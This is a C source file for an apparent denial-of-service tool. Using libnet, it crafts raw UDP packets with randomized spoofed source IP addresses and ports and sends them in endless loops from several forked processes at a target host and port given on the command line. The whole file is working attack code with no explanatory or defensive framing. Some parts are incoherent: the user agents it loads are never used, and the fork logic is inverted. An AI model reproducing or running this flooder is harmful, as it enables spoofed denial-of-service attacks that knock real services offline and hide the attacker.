#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <libnet.h>

#define CONNECTIONS 45
#define THREADS 25
#define MAX_USER_AGENTS 10000  // Increased the limit to handle more user agents

char *user_agents[MAX_USER_AGENTS];
int user_agent_count = 0;

// Function to load user agents from file
void load_user_agents(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        fprintf(stderr, "Could not open %s\n", filename);
        exit(1);
    }

    char line[1024];
    while (fgets(line, sizeof(line), file)) {
        size_t len = strlen(line);
        if (len > 0 && line[len - 1] == '\n') {
            line[len - 1] = '\0';
        }
        user_agents[user_agent_count] = strdup(line);
        user_agent_count++;
    }

    fclose(file);
    if (user_agent_count == 0) {
        fprintf(stderr, "No user agents found in %s\n", filename);
        exit(1);
    }
    fprintf(stderr, "Loaded %d user agents from %s\n", user_agent_count, filename);
}

// Function to send spoofed UDP packets
void send_spoofed_udp_packet(char *target_ip, int target_port) {
    libnet_t *l;
    libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];
    uint32_t src_ip, dst_ip;
    uint16_t src_port, dst_port;

    l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (l == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        return;
    }

    dst_ip = libnet_name2addr4(l, target_ip, LIBNET_DONT_RESOLVE);
    if (dst_ip == -1) {
        fprintf(stderr, "Error converting destination IP\n");
        libnet_destroy(l);
        return;
    }

    // Create random source IP and port
    src_ip = libnet_get_prand(LIBNET_PRu32);
    src_port = libnet_get_prand(LIBNET_PRu16);

    // Build UDP packet
    t = libnet_build_udp(
            src_port,                          // source port
            target_port,                       // destination port
            LIBNET_UDP_H + 4,                  // length of the packet (header + data)
            0,                                 // checksum (0 means libnet will autofill)
            (uint8_t *)"data",                 // payload
            4,                                 // payload size
            l,                                 // libnet context
            0                                  // libnet id (0 for new packet)
    );
    if (t == -1) {
        fprintf(stderr, "Error building UDP header: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        return;
    }

    // Build IP packet
    t = libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_UDP_H + 4,  // length of IP packet (header + data)
            0,                                 // TOS
            libnet_get_prand(LIBNET_PRu16),    // IP ID
            0,                                 // fragmentation
            64,                                // TTL
            IPPROTO_UDP,                       // upper layer protocol
            0,                                 // checksum (0 means libnet will autofill)
            src_ip,                            // source IP
            dst_ip,                            // destination IP
            NULL,                              // payload (none here)
            0,                                 // payload size
            l,                                 // libnet context
            0                                  // libnet id (0 for new packet)
    );
    if (t == -1) {
        fprintf(stderr, "Error building IP header: %s\n", libnet_geterror(l));
        libnet_destroy(l);
        return;
    }

    // Send the packet
    if (libnet_write(l) == -1) {
        fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
    }

    libnet_destroy(l);
}

// Function to perform the attack
void attack(char *host, char *port, int id) {
    signal(SIGPIPE, SIG_IGN);  // Ignore SIGPIPE signals

    srand(time(NULL) ^ (getpid() << 16));  // Initialize random seed

    while (1) {
        const char *user_agent = user_agents[rand() % user_agent_count];

        // Send a spoofed UDP packet
        send_spoofed_udp_packet(host, atoi(port));

        fprintf(stderr, "[%i: Spoofed UDP packet sent]\n", id);

        usleep(300000);
    }
}

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_host> <target_port>\n", argv[0]);
        exit(1);
    }

    load_user_agents("/usr/share/dos-tools/user_agents.txt");

    int x;
    for (x = 0; x != THREADS; x++) {
        if (fork())
            attack(argv[1], argv[2], x);
        usleep(200000);
    }
    getc(stdin);
    return 0;
}
